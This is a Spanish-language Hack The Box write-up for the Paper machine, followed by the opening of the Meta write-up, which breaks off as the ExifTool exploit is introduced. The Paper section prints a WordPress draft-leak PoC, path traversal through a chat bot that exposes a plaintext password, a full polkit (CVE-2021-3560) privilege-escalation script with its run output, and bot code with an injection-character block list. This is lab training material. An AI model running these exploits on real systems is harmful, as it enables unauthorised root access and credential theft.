58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-title: HTTP Server Test Page powered by CentOS 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-title: HTTP Server Test Page powered by CentOS | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US | Subject Alternative Name: DNS:localhost.localdomain | Not valid before: 2021-07-03T08:52:34 |_Not valid after: 2022-07-08T10:32:34 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Feb 5 23:20:09 2022 -- 1 IP address (1 host up) scanned in 18.70 seconds Web Site Realizamos una solicitud al sitio web con curl y vemos el header X-Backend-Server el dominio office.paper el cual agregamos al archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/paper ❯ curl -sI http://10.129.104.126/ HTTP/1.1 403 Forbidden Date: Sat, 05 Feb 2022 23:52:20 GMT Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 X-Backend-Server: office.paper Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT ETag: \u0026#34;30c0b-5c5c7fdeec240\u0026#34; Accept-Ranges: bytes Content-Length: 199691 Content-Type: text/html; charset=UTF-8 π ~/htb/paper ❯ Tras visitar el sitio web vemos multiples posts, además observamos en el footer que es un WordPress.\nWpscan Ejecutamos wpscan para enumerar toda la información posible, se muestra la versión de WordPress como Insegura y encontramos tres usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 π ~/htb/paper ❯ wpscan --url http://office.paper/ -e ap,vt,cb,dbe,u, _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.18 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://office.paper/ [10.129.104.126] [+] Started: Sat Feb 5 23:54:13 2022 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 | - X-Powered-By: PHP/7.2.24 | - X-Backend-Server: office.paper | Found By: Headers (Passive Detection) | Confidence: 100% [+] WordPress readme found: http://office.paper/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05). | Found By: Rss Generator (Passive Detection) | - http://office.paper/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.2.3\u0026lt;/generator\u0026gt; | - http://office.paper/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.2.3\u0026lt;/generator\u0026gt; [+] WordPress theme in use: construction-techup | Location: http://office.paper/wp-content/themes/construction-techup/ | Last Updated: 2021-07-17T00:00:00.000Z | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt | [!] The version is out of date, the latest version is 1.4 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1 | Style Name: Construction Techup | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a... | Author: wptexture | Author URI: https://testerwp.com/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) | - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: \u0026#39;Version: 1.1\u0026#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [.. snip ..] [i] User(s) Identified: [+] prisonmike | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] nick | Found By: Wp Json Api (Aggressive Detection) | - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Confirmed By: | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] creedthoughts | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [.. snip ..] WordPress Revisamos la version y vulnerabilidades a la version 5.2.3 en la pagina de WordPress, entre ellas destacamos el CVE-2019-17671 donde observamos que es posible ver post privados o borradores, se muestra el PoC.\n1 http://wordpress.local/?static=1\u0026amp;order=asc Tras emplear el PoC en el sitio, vemos \u0026ldquo;multiples posts\u0026rdquo;, se menciona un sistema de chat y vemos una url con un nuevo subdominio el cual agregamos a /etc/hots.\nUser - Dwight Rocket.chat La url de registro nos lleva a sistema de chat rocket.chat.\nTras ingresar vemos el único canal, #general, aunque es de \u0026lsquo;sólo lectura\u0026rsquo;.\nVemos muchos mensajes entre ellos se menciona un bot y se listan los diferentes comandos aceptados.\n\u0026lsquo;kelly\u0026rsquo; menciona que el bot funciona por Mensajes Directos, por lo que iniciamos una conversación con el bot.\nHubot Enviamos el comando help y nuevamente vemos los diferentes comandos, pero vemos 2 interesantes, file y list.\n1 2 3 4 5 6 7 8 For security reasons, the access is limited to the Sales folder. 3. Files: eg: \u0026#39;recyclops get me the file test.txt\u0026#39;, or \u0026#39;recyclops could you send me the file sale/secret.xls\u0026#39; or just \u0026#39;recyclops file test.txt\u0026#39; 4. List: You can ask me to list the files eg: \u0026#39;recyclops i need directory list sale\u0026#39; or just \u0026#39;recyclops list sale\u0026#39; file realiza cat al archivo dado, en el directorio /home/dwight/sales/test.txt y list muestra los directorios/archivos en sales/.\nIntentamos realizar \u0026lsquo;Command Injection\u0026rsquo; pero parece tener algun tipo de filtro.\nRealizamos una enumeración de archivos dentro del directorio utilizando ../ vemos multiples directorios/archivos en home/dwight.\nEn la carpeta hubot/ vemos archivos de configuración y codigo fuente del bot.\nEl archivo .env contiene la configuración del bot, y vemos credenciales.\n1 2 3 4 5 6 7 8 9 10 11 file ../hubot/.env \u0026lt;!=====Contents of file ../hubot/.env=====\u0026gt; export ROCKETCHAT_URL=\u0026#39;http://127.0.0.1:48320\u0026#39; export ROCKETCHAT_USER=recyclops export ROCKETCHAT_PASSWORD=Queenofblad3s!23 export ROCKETCHAT_USESSL=false export RESPOND_TO_DM=true export RESPOND_TO_EDITED=true export PORT=8000 export BIND_ADDRESS=127.0.0.1 \u0026lt;!=====End of file ../hubot/.env=====\u0026gt; Shell Usamos la contraseña por SSH con el usuario dwight, logramos obtener una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/paper ❯ ssh dwight@office.paper # Queenofblad3s!23 dwight@office.paper\u0026#39;s password: Activate the web console with: systemctl enable --now cockpit.socket Last login: Sat Feb 5 20:12:06 2022 from 10.10.14.133 [dwight@paper ~]$ whoami;id;pwd dwight uid=1004(dwight) gid=1004(dwight) groups=1004(dwight) /home/dwight [dwight@paper ~]$ ls bot_restart.sh\thubot pk.sh sales user.txt [dwight@paper ~]$ cat user.txt 70b576347b2ee4017a05dd869dfcb5fa [dwight@paper ~]$ Privesc Enumeramos la carpeta del usuario dwight, encontramos un script en bash pk.sh.\n1 2 3 4 5 6 7 8 9 10 [dwight@paper ~]$ ll total 16 -rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot -rwxrwxr-x 1 dwight dwight 2812 Jan 14 06:48 pk.sh drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales -r-------- 1 dwight dwight 33 Feb 5 15:18 user.txt [dwight@paper ~]$ file pk.sh pk.sh: Bourne-Again shell script, ASCII text executable [dwight@paper ~]$ Polkit El script realiza una explotiación en la API de polkit, registra el usuario hacked con la contraseña password, agregando este como usuario privilegiado. Todo indica que se trata de un exploit para la vulnerabilidad en polkit para escalar privilegios.\nExpand me: pk.sh\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 #!/bin/bash # Set the name and display name userName=\u0026#34;hacked\u0026#34; realName=\u0026#34;hacked\u0026#34; # Set the account as an administrator accountType=1 # Set the password hash for \u0026#39;password\u0026#39; and password hint password=\u0026#39;$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB\u0026#39; passHint=\u0026#34;password\u0026#34; # Check Polkit version polkitVersion=$(systemctl status polkit.service | grep version | cut -d \u0026#34; \u0026#34; -f 9) if [[ \u0026#34;$(apt list --installed 2\u0026gt;/dev/null | grep polkit | grep -c 0.105-26)\u0026#34; -ge 1 || \u0026#34;$(yum list installed | grep polkit | grep -c 0.117-2)\u0026#34; ]]; then echo \u0026#34;[*] Vulnerable version of polkit found\u0026#34; else echo \u0026#34;[!] WARNING: Version of polkit might not vulnerable\u0026#34; fi # Validate user is running in SSH instead of desktop terminal if [[ -z $SSH_CLIENT || -z $SSH_TTY ]]; then echo \u0026#34;[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts\u0026#34; exit fi # Test the dbus-send timing to load into exploit echo \u0026#34;[*] Determining dbus-send timing\u0026#34; realTime=$( TIMEFORMAT=\u0026#34;%R\u0026#34;; { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType ; } 2\u0026gt;\u0026amp;1 | cut -d \u0026#34; \u0026#34; -f6 ) halfTime=$(echo \u0026#34;scale=3;$realTime/2\u0026#34; | bc) # Check for user first in case previous run of script failed on password set if id \u0026#34;$userName\u0026#34; \u0026amp;\u0026gt;/dev/null; then userid=$(id -u $userName) echo \u0026#34;[*] New user $userName already exists with uid of $userid\u0026#34; else userid=\u0026#34;\u0026#34; echo \u0026#34;[*] Attempting to create account\u0026#34; while [[ $userid == \u0026#34;\u0026#34; ]] do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2\u0026gt;/dev/null \u0026amp; sleep $halfTime ; kill $! 2\u0026gt;/dev/null if id \u0026#34;$userName\u0026#34; \u0026amp;\u0026gt;/dev/null; then userid=$(id -u $userName) echo \u0026#34;[*] New user $userName created with uid of $userid\u0026#34; fi done fi # Add the password to /etc/shadow # Sleep added to ensure there is enough of a delay between timestamp checks echo \u0026#34;[*] Adding password to /etc/shadow and enabling user\u0026#34; sleep 1 currentTimestamp=$(stat -c %Z /etc/shadow) fileChanged=\u0026#34;n\u0026#34; while [ $fileChanged == \u0026#34;n\u0026#34; ] do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2\u0026gt;/dev/null \u0026amp; sleep $halfTime ; kill $! 2\u0026gt;/dev/null if [ $(stat -c %Z /etc/shadow) -ne $currentTimestamp ];then fileChanged=\u0026#34;y\u0026#34; echo \u0026#34;[*] Exploit complete!\u0026#34; fi done echo \u0026#34;\u0026#34; echo \u0026#34;[*] Run \u0026#39;su - $userName\u0026#39;, followed by \u0026#39;sudo su\u0026#39; to gain root access\u0026#34; Utilizamos este mismo script para realizar la explotación, tras un primer intento pareciera no funcionar, aun asi muestra que todo fue exitoso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 [dwight@paper ~]$ ./pk.sh Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id \u0026#34;failovermethod\u0026#34; does not exist Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id \u0026#34;failovermethod\u0026#34; does not exist Modular dependency problems: Problem 1: conflicting requests - nothing provides module(perl:5.26) needed by module perl-IO-Socket-SSL:2.066:8030020201222215140:1e4bbb35.x86_64 Problem 2: conflicting requests - nothing provides module(perl:5.26) needed by module perl-libwww-perl:6.34:8030020201223164340:b967a9a2.x86_64 [*] Vulnerable version of polkit found [*] Determining dbus-send timing [*] Attempting to create account ./pk.sh: line 48: 21609 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2\u0026gt; /dev/null [.. snip ..] ./pk.sh: line 48: 27079 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2\u0026gt; /dev/null [*] New user hacked created with uid of 1005 [*] Adding password to /etc/shadow and enabling user [*] Exploit complete! [*] Run \u0026#39;su - hacked\u0026#39;, followed by \u0026#39;sudo su\u0026#39; to gain root access [dwight@paper ~]$ su - hacked su: user hacked does not exist [dwight@paper ~]$ Shell Tras una segunda ejecución vemos que el usuario es registrado, y obtiene privilegio root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [dwight@paper ~]$ ./pk.sh Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id \u0026#34;failovermethod\u0026#34; does not exist [..snip ..] [*] Exploit complete! ./pk.sh: line 64: 31284 Terminated dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2\u0026gt; /dev/null [*] Run \u0026#39;su - hacked\u0026#39;, followed by \u0026#39;sudo su\u0026#39; to gain root access [dwight@paper ~]$ su - hacked Password: [hacked@paper ~]$ id uid=1005(hacked) gid=1005(hacked) groups=1005(hacked),10(wheel) [hacked@paper ~]$ sudo su [sudo] password for hacked: [root@paper hacked]# id uid=0(root) gid=0(root) groups=0(root) Finalmente la flag root.txt\n1 2 3 4 5 6 [root@paper hacked]# cd /root [root@paper ~]# ls anaconda-ks.cfg initial-setup-ks.cfg root.txt [root@paper ~]# cat root.txt 65da21d38614e574d8c1990545f2b49b [root@paper ~]# Nota: en este caso utilizamos el script almacenado en la máquina, sugiero visitar el Write-up de 0xdf - HTB Paper.\nPaper: Post del autor que habla sobre el proceso e ideas de la creación de la máquina.\nHubot, Cronjob Vemos que existe un cronjob que restaura el archivo /etc/passwd y /etc/shadow, es por ello que el primer intento con pk.sh no funcionó.\n1 2 3 4 5 6 7 8 9 10 11 12 [root@paper ~]# crontab -l */2 * * * * /root/.restore/restore.sh [root@paper ~]# cat /root/.restore/restore.sh #!/bin/bash for u in `/usr/bin/comm -23 /etc/passwd /root/.restore/passwd | cut -d \u0026#39;:\u0026#39; -f1` do /usr/sbin/userdel -fr \u0026#34;$u\u0026#34; done cp -a /root/.restore/{passwd,shadow} /etc [root@paper ~]# Vemos el codigo de los comandos files y list, en ambos existe un \u0026ldquo;filtro\u0026rdquo; para ciertos caracteres que no permite realizar \u0026lsquo;Command Injection\u0026rsquo;.\nhubot/{files,listof}\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 scripts/files.js // Description: // Runs a command on hubot // TOTAL VIOLATION of any and all security! // // Commands: // hubot run \u0026lt;command\u0026gt; - runs a command on hubot host module.exports = function(robot) { var user = \u0026#34;dwight\u0026#34;; robot.respond(\u0026#34;/file (.*)$/i\u0026#34;, function(msg) { console.log(msg); var out = msg.match[1]; // Don\u0026#39;t judge me. If it is working, then it ain\u0026#39;t stupid. if((out.includes(\u0026#34;;\u0026#34;)) || (out.includes(\u0026#34;`\u0026#34;)) || (out.includes(\u0026#34;\u0026amp;\u0026#34;)) || (out.includes(\u0026#34;$\u0026#34;)) || (out.includes(\u0026#34;0x0a\u0026#34;)) || (out.includes(\u0026#34;\\\\n\u0026#34;))|| (out.includes(\u0026#34;*\u0026#34;)) || (out.includes(\u0026#34;?\u0026#34;)) || (out.includes(\u0026#34;|\u0026#34;)) || (out.includes(\u0026#34;[\u0026#34;)) || (out.includes(\u0026#34;{\u0026#34;)) || (out.includes(\u0026#34;(\u0026#34;)) || (out.includes(\u0026#34;\\\u0026#34;\u0026#34;)) || (out.includes(\u0026#34;\\\\\u0026#34;)) || (out.includes(\u0026#34;\u0026gt;\u0026#34;)) || (out.includes(\u0026#34;\u0026lt;\u0026#34;)) || (out.includes(\u0026#34;\u0026#39;\u0026#34;)) || (out.includes(\u0026#34;%\u0026#34;)) ){ msg.send(\u0026#34;Stop injecting OS commands!\u0026#34;); return; } if(out.includes(\u0026#34;user\u0026#34;)){ msg.send(\u0026#34;Access denied.\u0026#34;); return; }\telse{ var cmd = \u0026#34;cat \u0026#34; + \u0026#34; \u0026#34; +\u0026#34;/home/\u0026#34;+user+\u0026#34;/sales/\u0026#34;+ out; var exec = require(\u0026#39;child_process\u0026#39;).exec; exec(cmd, function(error, stdout, stderr) { if (error) { msg.send(error); msg.send(stderr); } else { msg.send(\u0026#34;\u0026lt;!=====Contents of file \u0026#34; + out + \u0026#34;=====\u0026gt;\u0026#34;); msg.send(stdout); msg.send(\u0026#34;\u0026lt;!=====End of file \u0026#34; + out + \u0026#34;=====\u0026gt;\u0026#34;); } }); } }); }; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 scripts/listof.js // Description: // Runs a command on hubot // TOTAL VIOLATION of any and all security! // // Commands: // hubot run \u0026lt;command\u0026gt; - runs a command on hubot host module.exports = function(robot) { var user = \u0026#34;dwight\u0026#34;; robot.respond(\u0026#34;/list(.*)$/i\u0026#34;, function(msg) { console.log(msg); var out = msg.match[1]; var cmd=\u0026#34;\u0026#34; // Don\u0026#39;t judge me. If it is working, then it ain\u0026#39;t stupid. if((out.includes(\u0026#34;;\u0026#34;)) || (out.includes(\u0026#34;`\u0026#34;)) || (out.includes(\u0026#34;\u0026amp;\u0026#34;)) || (out.includes(\u0026#34;$\u0026#34;)) || (out.includes(\u0026#34;0x0a\u0026#34;)) || (out.includes(\u0026#34;\\\\n\u0026#34;))|| (out.includes(\u0026#34;*\u0026#34;)) || (out.includes(\u0026#34;?\u0026#34;)) || (out.includes(\u0026#34;|\u0026#34;)) || (out.includes(\u0026#34;[\u0026#34;)) || (out.includes(\u0026#34;{\u0026#34;)) || (out.includes(\u0026#34;(\u0026#34;)) || (out.includes(\u0026#34;\\\u0026#34;\u0026#34;)) || (out.includes(\u0026#34;\\\\\u0026#34;)) || (out.includes(\u0026#34;\u0026gt;\u0026#34;)) || (out.includes(\u0026#34;\u0026lt;\u0026#34;)) || (out.includes(\u0026#34;\u0026#39;\u0026#34;)) || (out.includes(\u0026#34;%\u0026#34;)) ){ msg.send(\u0026#34;Stop injecting OS commands!\u0026#34;); return; } if(out == \u0026#34;\u0026#34;){ var dir=\u0026#34;/sales/\u0026#34; msg.send(\u0026#34;Fetching the directory listing of \u0026#34; + dir); cmd = \u0026#34;ls -la\u0026#34; + \u0026#34; \u0026#34; +\u0026#34;/home/\u0026#34;+user+ dir; } if(out !=\u0026#34;\u0026#34;) { msg.send(\u0026#34;Fetching the directory listing of \u0026#34; + out); cmd = \u0026#34;ls -la\u0026#34; + \u0026#34; \u0026#34; +\u0026#34;/home/\u0026#34;+user+\u0026#34;/sales/\u0026#34;+out.trim(); } var exec = require(\u0026#39;child_process\u0026#39;).exec; exec(cmd, function(error, stdout, stderr) { if (error) { msg.send(error); msg.send(stderr); } else { msg.send(stdout); } }); }); }; ","description":"En Paper descubrimos una vulnerabilidad que permite leer los posts archivados/privados lo que nos permitió acceder a un link de registro de Rocket.chat, en este ultimo logramos listar y observar el contenido de archivos de la máquina con la ayuda de comandos de un Bot, lo que nos dio acceso por SSH. Finalmente escalamos privilegios explotando la vulnerabilidad de Polkit.","id":24,"section":"posts","tags":["wpscan","wordpress","rocket.chat","polkit","go","CVE-2021-3560"],"title":"Hack The Box - Paper","uri":"https://sckull.github.io/posts/paper/"},{"content":"\rTras una enumeración de subdominios encontramos MetaView la cual utiliza una version de ExifTool vulnerable por la cual logramos obtener acceso a la máquina. Tras descubrir un cronjob que ejecuta ImageMagick con una version vulnerable logramos acceder a un segundo usuario. Finalmente escalamos privilegios modificando la variable de configuracion de usuario para neofetch.\nNombre Meta OS Linux Puntos 30 Dificultad Media IP 10.10.11.140 Maker Nauten\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.9, 5, 5.5, 4.5, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 7, 8, 2, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap nos muestra abiertos los puertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Nmap 7.91 scan initiated Sat Jan 22 23:50:19 2022 as: nmap -sS -sV -sC -Pn -p- --min-rate 3000 -oN nmap_scan 10.129.99.144 Warning: 10.129.99.144 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.99.144 (10.129.99.144) Host is up (0.081s latency). Not shown: 59823 closed ports, 5710 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA) | 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA) |_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Did not follow redirect to http://artcorp.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jan 22 23:52:07 2022 -- 1 IP address (1 host up) scanned in 108.65 seconds Web Site El sitio web nos redirige a un dominio: artcorp.htb.\n1 2 3 4 5 6 7 8 π ~/htb/meta ❯ curl -sI 10.129.99.144 HTTP/1.1 301 Moved Permanently Date: Sat, 22 Jan 2022 23:52:10 GMT Server: Apache Location: http://artcorp.htb Content-Type: text/html; charset=UTF-8 π ~/htb/meta ❯ El sitio web no muestra mucha información.\nDirectory Brute Forcing feroxbuster muestra recursos del sitio web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 π ~/htb/meta ❯ feroxbuster -u http://artcorp.htb/ -w $MD -x php,html,txt --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://artcorp.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, html, txt] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 200 86l 263w 4427c http://artcorp.htb/index.html 301 7l 20w 234c http://artcorp.htb/assets 301 7l 20w 231c http://artcorp.htb/css 403 7l 20w 199c http://artcorp.htb/server-status Subdominios Ejecutamos ffuf para enumerar los subdominios, descubrimos dev01.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/meta ❯ ffuf -w bitquark-subdomains-top100000.txt -H \u0026#34;Host: FUZZ.artcorp.htb\u0026#34; -u http://artcorp.htb -fl 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://artcorp.htb :: Wordlist : FUZZ: bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.artcorp.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response lines: 1 ________________________________________________ dev01 [Status: 200, Size: 247, Words: 16, Lines: 10] :: Progress: [100000/100000] :: Job [1/1] :: 209 req/sec :: Duration: [0:09:27] :: Errors: 0 :: π ~/htb/meta ❯ Meta - Exiftool El sitio web muestra un aplicación en desarrollo.\nAgrega una dirección.\n1 2 3 4 5 6 7 8 9 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;ArtCorp dev environment\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Currently applications in development:\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;http://dev01.artcorp.htb/metaview/\u0026#34;\u0026gt;MetaView\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;* Only applications ready to be tested are listed\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; La nueva dirección muestra un formulario para subir archivos.\nUnicamente acepta archivos jpg/png.\n1 File not allowed (only jpg/png). Tras subir una imagen .png vemos los metadatos de la imagen, pareciera ser información de exiftool.\nVemos localmente información similar al ejecutar localmente sobre la imagen.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/meta ❯ exiftool 5bat.png ExifTool Version Number : 12.30 File Name : 5bat.png Directory : . File Size : 187 KiB File Modification Date/Time : 2016:10:22 12:28:12+00:00 File Access Date/Time : 2022:02:02 00:19:44+00:00 File Inode Change Date/Time : 2022:01:23 00:55:00+00:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 700 Image Height : 728 Bit Depth : 8 Color Type : Palette Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Gamma : 2.2 SRGB Rendering : Perceptual Palette : (Binary data 768 bytes, use -b option to extract) Transparency : (Binary data 36 bytes, use -b option to extract) Image Size : 700x728 Megapixels : 0.510 π ~/htb/meta ❯ exiftool -ver 12.30 User - www-data Investigando sobre exiftool, encontramos un post en Hackerone que explica que es posible ejecutar comandos ya que existe un bug en el modulo DjVu. Encontramos un repositorio donde encontramos un archivo de configuración para ejecutar 